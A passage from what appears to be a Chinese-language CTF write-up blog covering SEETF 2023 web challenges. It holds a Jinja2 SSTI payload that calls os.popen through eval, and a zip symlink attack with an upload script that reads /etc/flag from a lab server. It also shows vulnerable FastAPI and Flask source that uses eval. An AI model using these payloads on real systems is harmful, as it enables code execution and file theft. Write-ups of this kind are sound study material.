&#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;array.array&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;platform._Processor&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;sqlite3.Row&#x27;&gt;, &lt;class &#x27;sqlite3.Cursor&#x27;&gt;, &lt;class &#x27;sqlite3.Connection&#x27;&gt;, &lt;class &#x27;sqlite3Node&#x27;&gt;, &lt;class &#x27;sqlite3.Cache&#x27;&gt;, &lt;class &#x27;sqlite3.Statement&#x27;&gt;, &lt;class &#x27;sqlite3.PrepareProtocol&#x27;&gt;, &lt;class &#x27;waitress.utilities.Error&#x27;&gt;, &lt;class &#x27;waitress.wasyncore.dispatcher&#x27;&gt;, &lt;class &#x27;waitress.wasyncore.file_wrapper&#x27;&gt;, &lt;class &#x27;waitress.trigger._triggerbase&#x27;&gt;, &lt;class &#x27;waitress.adjustments._bool_marker&#x27;&gt;, &lt;class &#x27;waitress.adjustments.Adjustments&#x27;&gt;, &lt;class &#x27;waitress.buffers.FileBasedBuffer&#x27;&gt;, &lt;class &#x27;waitress.buffers.OverflowableBuffer&#x27;&gt;, &lt;class &#x27;waitress.receiver.FixedStreamReceiver&#x27;&gt;, &lt;class &#x27;waitress.receiver.ChunkedReceiver&#x27;&gt;, &lt;class &#x27;waitress.parser.HTTPRequestParser&#x27;&gt;, &lt;class &#x27;waitress.task.ThreadedTaskDispatcher&#x27;&gt;, &lt;class &#x27;waitress.task.Task&#x27;&gt;, &lt;class &#x27;waitress.server.MultiSocketServer&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">alllist=[]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i==<span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result+=i</span><br><span class="line"><span class="comment">#寻找要找的类，并返回其索引</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(alllist):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;warnings.catch_warnings&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br></pre></td></tr></table></figure><br>结果:216—-&gt; <class 'warnings.catch_warnings'><br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[216].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat init.py&#x27;).read()&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/25/6jhHvYp59eWkraN.png" alt="image.png"></p>
<p>==重点:==<br>参考了<a href="https://blog.l1ao.top/2023/06/12/SEECTFwriteups/的wp,这里的登录靠的是sqlite3的单引号和双引号的区别">https://blog.l1ao.top/2023/06/12/SEECTFwriteups/的wp,这里的登录靠的是sqlite3的单引号和双引号的区别</a><br><img src="https://s2.loli.net/2023/09/25/dOi6oxIwCU8Rp9X.png" alt="image.png"></p>
<h3 id="SEETF-2023-Throw-your-malware-here"><a href="#SEETF-2023-Throw-your-malware-here" class="headerlink" title="[SEETF 2023]Throw your malware here!"></a>[SEETF 2023]Throw your malware here!</h3><p>题目描述(翻译后):FLOSS是高级“字符串”，所以我决定将其作为SAAS运行！鸽子不断向我扔的混淆代码已经够多了！事实上，我决定处理所有类型的文件，甚至是非PE文件和受密码保护的zip文件！标志位于 ‘/etc/flag’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, HTTPException, UploadFile</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> JSONResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE_CACHE = Path(<span class="string">&quot;/app/cache&quot;</span>)</span><br><span class="line">FLOSS_PATH = Path(<span class="string">&quot;/usr/local/bin/floss&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_string</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">16</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># choose from all lowercase letter</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random.choice(letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.on_event(<span class="params"><span class="string">&quot;startup&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">startup</span>():</span><br><span class="line">    <span class="comment"># Ensure caches exist</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> FILE_CACHE.is_dir():</span><br><span class="line">        FILE_CACHE.mkdir()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_floss</span>(<span class="params">target: Path</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    args = [<span class="built_in">str</span>(target), <span class="string">&quot;--json&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pefile.PE(name=<span class="built_in">str</span>(target))</span><br><span class="line">    <span class="keyword">except</span> pefile.PEFormatError:</span><br><span class="line">        args.extend((<span class="string">&quot;--only&quot;</span>, <span class="string">&quot;static&quot;</span>))</span><br><span class="line">    output = subprocess.check_output((FLOSS_PATH, *args))</span><br><span class="line">    <span class="keyword">return</span> output.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/floss&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">floss_endpoint</span>(<span class="params">sample: UploadFile, password: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; JSONResponse:</span><br><span class="line">    random_path = get_random_string()</span><br><span class="line">    <span class="keyword">while</span> (target_path := FILE_CACHE / random_path).exists():</span><br><span class="line">        random_path = get_random_string()</span><br><span class="line">    <span class="keyword">with</span> target_path.<span class="built_in">open</span>(<span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        shutil.copyfileobj(sample.file, f)</span><br><span class="line">    is_zipfile = zipfile.is_zipfile(target_path)</span><br><span class="line">    <span class="keyword">if</span> is_zipfile:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(target_path) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="comment"># No zip bombs!</span></span><br><span class="line">            file_size_sum = <span class="built_in">sum</span>(data.file_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            compressed_size_sum = <span class="built_in">sum</span>(data.compress_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            <span class="keyword">if</span> (file_size_sum / compressed_size_sum &gt; <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">413</span>, <span class="string">&quot;Zip Bomb Detected&quot;</span>)</span><br><span class="line"></span><br><span class="line">            zipobjects = f.infolist()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(zipobject.file_size &gt; <span class="number">50000</span> <span class="keyword">for</span> zipobject <span class="keyword">in</span> zipobjects):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">418</span>, <span class="string">&quot;I&#x27;m a teapot!&quot;</span>)</span><br><span class="line">            files = f.namelist()</span><br><span class="line">        args = [<span class="string">&quot;unzip&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            args.extend((<span class="string">&quot;-P&quot;</span>, password))</span><br><span class="line">        args.extend((<span class="built_in">str</span>(target_path), <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;FILE_CACHE / random_path&#125;</span>-zip&quot;</span>))</span><br><span class="line">        a = subprocess.run(args)</span><br><span class="line">        <span class="keyword">if</span> a.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> HTTPException(<span class="number">422</span>, <span class="string">&quot;Invalid password!&quot;</span>)</span><br><span class="line">        targets = [FILE_CACHE / <span class="string">f&quot;<span class="subst">&#123;random_path&#125;</span>-zip&quot;</span> / file <span class="keyword">for</span> file <span class="keyword">in</span> files]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        targets = [target_path]</span><br><span class="line">    results = [run_floss(target) <span class="keyword">for</span> target <span class="keyword">in</span> targets]</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        &#123;target.name: result <span class="keyword">for</span> target, result <span class="keyword">in</span> <span class="built_in">zip</span>(targets, results)&#125;</span><br><span class="line">        <span class="keyword">if</span> is_zipfile</span><br><span class="line">        <span class="keyword">else</span> results[<span class="number">0</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>CHATGPT翻译一下,这里重点看floss路由:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这段代码是一个FastAPI路由（`/floss`），它处理文件上传并执行一系列操作，然后返回JSON响应。下面是这段代码的详细解释：</span><br><span class="line"></span><br><span class="line">1. `@app.post(&quot;/floss&quot;)`: 这是一个使用FastAPI框架的路由装饰器，指定了HTTP POST请求的路径为 `/floss`。这意味着当收到HTTP POST请求时，将执行以下函数来处理请求。</span><br><span class="line">    </span><br><span class="line">2. `def floss_endpoint(sample: UploadFile, password: Optional[str]) -&gt; JSONResponse:`: 这是路由处理函数的定义。它接受两个参数：</span><br><span class="line">    </span><br><span class="line">    - `sample: UploadFile`: 这是一个FastAPI的`UploadFile`类型的参数，表示从客户端上传的文件。它包含上传文件的内容和其他相关信息。</span><br><span class="line">    - `password: Optional[str]`: 这是一个可选的密码参数，用于解压缩受密码保护的ZIP文件。</span><br><span class="line">3. `random_path = get_random_string()`: 这一行生成一个随机的文件路径名称。</span><br><span class="line">    </span><br><span class="line">4. `while (target_path := FILE_CACHE / random_path).exists():`: 这是一个循环，用于确保生成的随机路径不会与已存在的文件路径冲突。它检查文件是否已经存在，如果存在则重新生成随机路径。</span><br><span class="line">    </span><br><span class="line">5. `with target_path.open(&quot;wb+&quot;) as f:`: 这一行打开目标文件，以二进制写入模式 (`wb+`)，准备将上传的文件内容写入目标文件。</span><br><span class="line">    </span><br><span class="line">6. `shutil.copyfileobj(sample.file, f)`: 这一行将从上传的文件 (`sample.file`) 中读取数据，并将其写入目标文件 (`f`) 中。</span><br><span class="line">    </span><br><span class="line">7. `is_zipfile = zipfile.is_zipfile(target_path)`: 这一行检查目标文件是否是一个ZIP文件，使用`zipfile.is_zipfile`函数。如果是ZIP文件，`is_zipfile`将为`True`，否则为`False`。</span><br><span class="line">    </span><br><span class="line">8. 如果目标文件是ZIP文件：</span><br><span class="line">    </span><br><span class="line">    - 首先，它计算ZIP文件中所有文件的总大小和压缩后的总大小，然后检查是否存在潜在的“zip bomb”攻击。如果ZIP文件中的文件总大小与压缩后的总大小之比大于10，就会引发HTTP异常，表示检测到可能的zip bomb攻击。</span><br><span class="line">    - 然后，它检查ZIP文件中是否存在文件大小超过50000字节的文件。如果存在，就会引发HTTP异常，返回HTTP状态码418（I&#x27;m a teapot）。</span><br><span class="line">9. 接下来，它使用`subprocess.run`运行`unzip`命令来解压缩ZIP文件。如果提供了密码，将使用`-P`选项传递密码参数。解压缩后的文件将被放在`FILE_CACHE / random_path-zip`目录下。</span><br><span class="line">    </span><br><span class="line">10. 如果`unzip`命令的返回代码不为0（表示解压缩过程出现了问题），它将引发HTTP异常，返回HTTP状态码422（Unprocessable Entity），表示密码无效。</span><br><span class="line">    </span><br><span class="line">11. 最后，它确定要分析的文件目标，如果是ZIP文件，则是解压缩后的文件列表，如果不是ZIP文件，则是目标文件本身。</span><br><span class="line">    </span><br><span class="line">12. 使用`run_floss`函数对每个文件目标进行分析。</span><br><span class="line">    </span><br><span class="line">13. 返回JSON响应，如果是ZIP文件，则以文件名作为键，分析结果作为值构建字典，如果不是ZIP文件，则返回单个分析结果。</span><br></pre></td></tr></table></figure></p>
<p>这里看了<a href="https://gudiffany.github.io/2023/08/18/13-21-58/#Throw-your-malware-here的wp发现是Zipslip漏洞,学了一下">https://gudiffany.github.io/2023/08/18/13-21-58/#Throw-your-malware-here的wp发现是Zipslip漏洞,学了一下</a><br>我们上传一个有恶意命令的压缩包,服务器解压缩就会执行恶意命令<br>这位师傅的wp<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s ../../../etc/flag flag.link</span><br><span class="line">创建一个指向/etc/flag的软链接,名字为flag.link</span><br><span class="line">zip -P flag --symlink flag.zip flag.link</span><br><span class="line">创建一个名为 `flag.zip` 的ZIP,密码是flag,包括 `flag.link` 指向的目标文件 `etc/flag`。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:28096/floss?password=flag&#x27;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;sample&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(res.status_code)</span><br><span class="line"><span class="built_in">print</span>(res.json())</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/25/kKfvBAihzr2aRqs.png" alt="image.png"></p>
<h3 id="SEETF-2023-福"><a href="#SEETF-2023-福" class="headerlink" title="[SEETF 2023]福"></a>[SEETF 2023]福</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/福&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fortold</span>():</span><br><span class="line">	keys.clear()</span><br><span class="line">	start = request.form.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">	app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = start</span><br><span class="line">	replace_secret_key()</span><br><span class="line"></span><br><span class="line">	value = [secret(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">	result = solve(*value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">eval</span>(<span class="built_in">chr</span>(result))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Bad Luck.&#x27;</span></span><br></pre></td></tr></table></figure>
<p>福路由有eval函数可以执行恶意命令<br>接收一个post传的key,执行replace_secret_key()函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_secret_key</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;key&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> keys:</span><br><span class="line">		keys.append(session[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">		app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = session[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> <span class="string">&#x27;end&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		new_session = session[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">		session.update(decrypt_cookie(new_session))</span><br><span class="line">		replace_secret_key()</span><br></pre></td></tr></table></figure><br>作用是更换secret_key<br>decrypt_cookie()函数:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_cookie</span>(<span class="params">signed_cookie</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		compressed = <span class="literal">False</span></span><br><span class="line">		<span class="keyword">if</span> signed_cookie.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">			compressed = <span class="literal">True</span></span><br><span class="line">			signed_cookie = signed_cookie[<span class="number">1</span>:]</span><br><span class="line">		data = signed_cookie.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">		data = base64_decode(data)</span><br><span class="line">		<span class="keyword">if</span> compressed:</span><br><span class="line">			data = zlib.decompress(data)</span><br><span class="line">		<span class="keyword">return</span> json.loads(data.decode())</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><br>解密一个cookie,首先检查是否有数据压缩，然后对数据进行解码和解压缩，最后将解密后的数据解析为 JSON 对象并返回</p>
